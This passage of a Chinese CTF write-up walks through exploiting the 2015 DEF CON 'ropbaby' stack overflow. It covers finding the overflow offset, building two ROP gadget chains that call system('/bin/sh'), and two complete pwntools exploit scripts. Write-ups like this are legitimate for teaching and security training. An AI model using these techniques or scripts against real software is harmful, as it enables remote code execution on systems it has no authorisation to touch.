Get libc address</span><br><span class="line">2) Get address of a libc function</span><br><span class="line">3) Nom nom r0p buffer to stack</span><br><span class="line">4) Exit</span><br><span class="line">: 3</span><br><span class="line">Enter bytes to send (max 1024): 50</span><br><span class="line"><span class="meta">AAA%</span>AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA</span><br><span class="line">1) Get libc address</span><br><span class="line">2) Get address of a libc function</span><br><span class="line">3) Nom nom r0p buffer to stack</span><br><span class="line">4) Exit</span><br><span class="line">: Bad choice.</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br></pre></td></tr></table></figure>
+<p>根据上表结果，当随机生成长度为50的字符串，并运行程序后，程序发生了崩溃，此时已触发异常，查看堆栈、RSP寄存器数据，结果如下：</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fw387j28vyj30n20f677k.jpg" alt=""></p>
+<p>上图显示，当代码执行到<code>0x555555554eb3 ret</code>时，函数返回，从rsp指针指向的栈顶地址中取出8个字节到rip寄存器继续执行，而此时栈顶数据为输入的字符串数据，显然返回地址已被覆盖，计算偏移量如下：</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fw387u0kzpj30lo016glx.jpg" alt=""></p>
+<p>即返回地址在输入字符串的偏移量为8，这与方法一中的结果一致。</p>
+<p><strong>结论：方法一和方法二结果显示，当输入的数据大于8个字节时，即触发栈溢出。并且，覆盖返回地址的偏移量为8。</strong></p>
+<p>两种方式对比：方式一从汇编代码的角度剖析漏洞本质，更深入；方式二从程序运行状态监测溢出点，更快捷。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>该题向参赛者发布ELF文件<code>ropbaby</code>和<code>libc-2.23.so</code>，参赛者利用ropbaby的漏洞连接远端地址，并触发漏洞获得远程主机的shell后获得flag。因此，获得shell通常需要执行<code>system(“/bin/sh”)</code>命令，即溢出后使得RIP跳转到system函数并执行。</p>
+<p>查询ropbaby的安全状态如下图所示，该程序启用了DEP，因此需要构建ROP片段执行代码。</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fw38a0jcofj309o058ab8.jpg" alt=""></p>
+<p>笔者提供2中构建<code>ROP Gadget</code>的方法，分别如下：</p>
+<h3 id="Gadget-1："><a href="#Gadget-1：" class="headerlink" title="Gadget 1："></a>Gadget 1：</h3><p>栈空间的布局如下，当函数返回时，执行<code>0x7fffffffdd68</code>引用的gadget：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">0x7fffffffdd60</th>
+<th>AAAAAAAA填充8字节</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">0x7fffffffdd68</td>
+<td>ROP Gadget，函数返回时执行 pop rax,   pop rdi, call rax</td>
+</tr>
+<tr>
+<td style="text-align:left">0x7fffffffdd70</td>
+<td>system函数地址</td>
+</tr>
+<tr>
+<td style="text-align:left">0x7fffffffdd78</td>
+<td>/bin/sh 字符串地址</td>
+</tr>
+</tbody>
+</table>
+<p><strong>1.</strong> <strong>查找ROP Gadget</strong></p>
+<p>使用ROPgadget工具查找代码片段（ROPgadget安装过程详见参考资料4），查询结果如下：</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fw38bv4vlmj30pg01cglv.jpg" alt=""></p>
+<p>如上图所示，符合条件的Gadget在libc-2.23.so的偏移量为<code>0x0000000000107419</code>。</p>
+<p><strong>2.</strong> <strong>查找system函数地址</strong></p>
+<p>使用<code>objdump</code>命令查找libc库的导出函数偏移地址，查询结果如下：</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fw38ciia2yj30n2026751.jpg" alt=""></p>
+<p>如上图所示，system函数在libc-2.23.so的偏移量为<code>0x0000000000045390</code>。</p>
+<p><strong>3.</strong> <strong>查找/bin/sh字符串地址</strong></p>
+<p>使用strings命令查找libc.so库中该字符串的偏移地址，查询结果如下：</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fw38d6ikpij30n201a3ym.jpg" alt=""></p>
+<p>如上图所示，<code>/bin/sh</code>字符串在libc-2.23.so的偏移量为<code>0x18cd57</code>。</p>
+<p>以上获得的3个地址，均为偏移地址，此时还需要获得libc库加载的基地址。从ropbaby提供的功能看，菜单选项1为获得libc基地址，如下：</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fw38dvr24nj30i004o74s.jpg" alt=""></p>
+<p>分析代码中的菜单1选项的代码逻辑，可以看到：</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fw38ebc4gjj30h403at94.jpg" alt=""></p>
+<p>程序在执行首先调用<code>dlopen()</code>函数动态加载libc.so.6库，并把返回的句柄handle写入[rbp+handle]，当选择菜单1选项后，获得handle，并打印输出，逻辑如下：</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fw38er6qmdj30li03ijry.jpg" alt=""></p>
+<p>可见菜单1返回的仅为libc库的调用句柄，而非libc加载的基地址。因此，若需获得libc加载的基地址，需要应用菜单2选项，获得system函数的虚拟地址，减去上文中获得的system函数的偏移量，即可获得libc函数的基地址。漏洞利用脚本的关键代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">system_offset = <span class="number">0x45390</span></span><br><span class="line">bin_sh_offset = <span class="number">0x18cd57</span></span><br><span class="line">rop_gadget_offset = <span class="number">0x107419</span>   <span class="comment"># pop rax, pop rdi, call rax</span></span><br><span class="line">libc_base_addr = parse_addr(system_addr) - system_offset  <span class="comment"># libc基地址</span></span><br><span class="line">bin_sh_addr = libc_base_addr + bin_sh_offset  <span class="comment"># /bin/sh 字符串的地址</span></span><br><span class="line">rop_gadget_addr = libc_base_addr + rop_gadget_offset  <span class="comment"># gadget地址</span></span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">8</span></span><br><span class="line">payload += p64(rop_gadget_addr)</span><br><span class="line">payload += p64(parse_addr(system_addr))</span><br><span class="line">payload += p64(bin_sh_addr)</span><br></pre></td></tr></table></figure>
+<p><strong>完整代码可见附件ropbaby2.py</strong></p>
+<h3 id="Gadget-2："><a href="#Gadget-2：" class="headerlink" title="Gadget 2："></a>Gadget 2：</h3><p>栈空间的布局如下，当函数返回时，执行<code>0x7fffffffdd68</code>引用的gadget：</p>
+<table>
+<thead>
+<tr>
+<th>0x7fffffffdd60</th>
+<th>AAAAAAAA填充8字节</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x7fffffffdd68</td>
+<td>ROP Gadget，函数返回时执行 pop rdi,   ret</td>
+</tr>
+<tr>
+<td>0x7fffffffdd70</td>
+<td>/bin/sh 字符串地址</td>
+</tr>
+<tr>
+<td>0x7fffffffdd78</td>
+<td>system函数地址</td>
+</tr>
+</tbody>
+</table>
+<p>获取所需地址的方法详见<strong>Gadget 1</strong>，关键代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">system_offset = <span class="number">0x45390</span></span><br><span class="line">bin_sh_offset = <span class="number">0x18cd57</span></span><br><span class="line">rop_gadget_offset = <span class="number">0x21102</span>   <span class="comment"># pop rdi, ret</span></span><br><span class="line">libc_base_addr = parse_addr(system_addr) - system_offset  <span class="comment"># libc基地址</span></span><br><span class="line">bin_sh_addr = libc_base_addr + bin_sh_offset  <span class="comment"># /bin/sh 字符串的地址</span></span><br><span class="line">rop_gadget_addr = libc_base_addr + rop_gadget_offset  <span class="comment"># gadget地址</span></span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">8</span></span><br><span class="line">payload += p64(rop_gadget_addr)</span><br><span class="line">payload += p64(bin_sh_addr)</span><br><span class="line">payload += p64(parse_addr(system_addr))</span><br></pre></td></tr></table></figure>
+<p><strong>完整代码可见附件ropbaby3.py</strong></p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>本题为一个典型的栈溢出漏洞利用题目，由于程序开启了DEP，因此需要构建ROP Gadget进行利用。</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><strong>[1]</strong> 64位CPU汇编代码参数传递方式</p>
+<p><a href="http://abcdxyzk.github.io/blog/2012/11/23/assembly-args/" target="_blank" rel="noopener">http://abcdxyzk.github.io/blog/2012/11/23/assembly-args/</a></p>
+<p><strong>[2]</strong> Linux下关闭ALSR(地址空间随机化)的方法</p>
+<p><a href="https://blog.csdn.net/force_eagle/article/details/8024502" target="_blank" rel="noopener">https://blog.csdn.net/force_eagle/article/details/8024502</a></p>
+<p><strong>[3]</strong> GDB实用插件(peda, gef, gdbinit)全解</p>
+<p><a href="https://blog.csdn.net/gatieme/article/details/63254211" target="_blank" rel="noopener">https://blog.csdn.net/gatieme/article/details/63254211</a></p>
+<p><strong>[4]</strong> ROPgadget</p>
+<p><a href="https://github.com/JonathanSalwan/ROPgadget/tree/master" target="_blank" rel="noopener">https://github.com/JonathanSalwan/ROPgadget/tree/master</a></p>
+<h2 id="再次感谢Moonshadow-CCSR的友情分享"><a href="#再次感谢Moonshadow-CCSR的友情分享" class="headerlink" title="再次感谢Moonshadow@CCSR的友情分享"></a>再次感谢Moonshadow@CCSR的友情分享</h2><h2 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h2><h3 id="ropbaby2-py"><a href="#ropbaby2-py" class="headerlink" title="ropbaby2.py"></a>ropbaby2.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">system_offset = <span class="number">0x45390</span></span><br><span class="line">bin_sh_offset = <span class="number">0x18cd57</span></span><br><span class="line">rop_gadget_offset = <span class="number">0x107419</span>   <span class="comment"># pop rax, pop rdi, call rax</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># parse addr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_addr</span><span class="params">(buffer)</span>:</span></span><br><span class="line">    re_addr=re.compile(<span class="string">r"0x([0-9A-Z]&#123;16,16&#125;)"</span>)  <span class="comment">#re</span></span><br><span class="line">    addr_str=re_addr.findall(buffer)</span><br><span class="line">    addr = <span class="number">0x0</span></span><br><span class="line">    <span class="keyword">if</span> addr_str != <span class="keyword">None</span>:</span><br><span class="line">        addr = int(addr_str[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    sh = process(<span class="string">"/home/roy/ropbaby/ropbaby"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">': '</span>)</span><br><span class="line">    sh.sendline(<span class="string">"1"</span>)</span><br><span class="line">    libcBaseAddr = sh.recvline()</span><br><span class="line">    print(libcBaseAddr)</span><br><span class="line">    sh.recvuntil(<span class="string">': '</span>)</span><br><span class="line">    sh.sendline(<span class="string">"2"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    sh.sendline(<span class="string">"system"</span>)</span><br><span class="line">    system_addr = sh.readline()</span><br><span class="line">    print(system_addr)</span><br><span class="line">    libc_base_addr = parse_addr(system_addr) - system_offset</span><br><span class="line">    bin_sh_addr = libc_base_addr + bin_sh_offset</span><br><span class="line">    rop_gadget_addr = libc_base_addr + rop_gadget_offset</span><br><span class="line">    payload = <span class="string">'A'</span>*<span class="number">8</span></span><br><span class="line">    payload += p64(rop_gadget_addr)</span><br><span class="line">    payload += p64(parse_addr(system_addr))</span><br><span class="line">    payload += p64(bin_sh_addr)</span><br><span class="line">    <span class="comment"># print(payload)</span></span><br><span class="line">    <span class="comment"># sh.recvuntil(': ')</span></span><br><span class="line">    sh.sendline(<span class="string">"3"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    sh.sendline(<span class="string">"32"</span>)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    sh.recv()</span><br><span class="line">    <span class="comment"># sh.recvuntil(': ')</span></span><br><span class="line">    <span class="comment"># sh.sendline('4')</span></span><br><span class="line"></span><br><span class="line">    sh.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="ropbaby3-py"><a href="#ropbaby3-py" class="headerlink" title="ropbaby3.py"></a>ropbaby3.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">system_offset = <span class="number">0x45390</span></span><br><span class="line">bin_sh_offset = <span class="number">0x18cd57</span></span><br><span class="line">rop_gadget_offset = <span class="number">0x21102</span>   <span class="comment"># pop rdi, ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># parse addr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_addr</span><span class="params">(buffer)</span>:</span></span><br><span class="line">    re_addr=re.compile(<span class="string">r"0x([0-9A-Z]&#123;16,16&#125;)"</span>)  <span class="comment">#re</span></span><br><span class="line">    addr_str=re_addr.findall(buffer)</span><br><span class="line">    addr = <span class="number">0x0</span></span><br><span class="line">    <span class="keyword">if</span> addr_str != <span class="keyword">None</span>:</span><br><span class="line">        addr = int(addr_str[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    sh = process(<span class="string">"/home/roy/ropbaby/ropbaby"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">': '</span>)</span><br><span class="line">    sh.sendline(<span class="string">"1"</span>)</span><br><span class="line">    libcBaseAddr = sh.recvline()</span><br><span class="line">    print(libcBaseAddr)</span><br><span class="line">    sh.recvuntil(<span class="string">': '</span>)</span><br><span class="line">    sh.sendline(<span class="string">"2"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    sh.sendline(<span class="string">"system"</span>)</span><br><span class="line">    system_addr = sh.readline()</span><br><span class="line">    print(system_addr)</span><br><span class="line">    libc_base_addr = parse_addr(system_addr) - system_offset</span><br><span class="line">    bin_sh_addr = libc_base_addr + bin_sh_offset</span><br><span class="line">    rop_gadget_addr = libc_base_addr + rop_gadget_offset</span><br><span class="line">    payload = <span class="string">'A'</span>*<span class="number">8</span></span><br><span class="line">    payload += p64(rop_gadget_addr)</span><br><span class="line">    payload += p64(bin_sh_addr)</span><br><span class="line">    payload += p64(parse_addr(system_addr))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(payload)</span></span><br><span class="line">    <span class="comment"># sh.recvuntil(': ')</span></span><br><span class="line">    sh.sendline(<span class="string">"3"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    sh.sendline(<span class="string">"32"</span>)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    sh.recv()</span><br><span class="line">    <span class="comment"># sh.recvuntil(': ')</span></span><br><span class="line">    <span class="comment"># sh.sendline('4')</span></span><br><span class="line"></span><br><span class="line">    sh.interactive()</span><br></pre></td></tr></table></figure>
+
+            
+
+        </div>
+    </div>
+    <div id="post-footer" class="post-footer main-content-wrap">
+        
+            <div class="post-footer-tags">
+                <span class="text-color-light text-small">标签</span><br/>
+                
+    <a class="tag tag--primary tag--small t-link" href="/tags/2015Defcon/">2015Defcon</a> <a class="tag tag--primary tag--small t-link" href="/tags/pwn/">pwn</a> <a class="tag tag--primary tag--small t-link" href="/tags/writeup/">writeup</a>
+
+            </div>
+        
+        
+        
+    </div>
+</article>
+
+
+
+                <footer id="footer" class="main-content-wrap">
+    <span class="copyrights">
+        Copyrights &copy; 2018 Yuan Shen. All Rights Reserved.
+    </span>
+</footer>
+
+            </div>
+            
+        </div>
+        
+
+
+    
+        
+    
+
+<div id="about">
+    <div id="about-card">
+        <div id="about-btn-close">
+            <i class="fa fa-times"></i>
+        </div>
+        
+            <img id="about-card-picture" src="/assets/images/yuan.jpg" alt="作者的图片"/>
+        
+            <h4 id="about-card-name">Yuan Shen</h4>
+        
+            <div id="about-card-bio"><p>author.bio</p>
+</div>
+        
+        
+            <div id="about-card-job">
+                <i class="fa fa-briefcase"></i>
+                <br/>
+                <p>author.job</p>
+
+            </div>
+        
+        
+    </div>
+</div>
+
+        
+        
+<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
+        <!--SCRIPTS-->
+<script src="/assets/js/script-vufjrm3fmbuttogo1hxuu0w9w0sesk5iyysjuguc2hdhufot9szxg8twijry.min.js"></script>
+<!--SCRIPTS END-->
+
+
+
+    </body>
+</html>
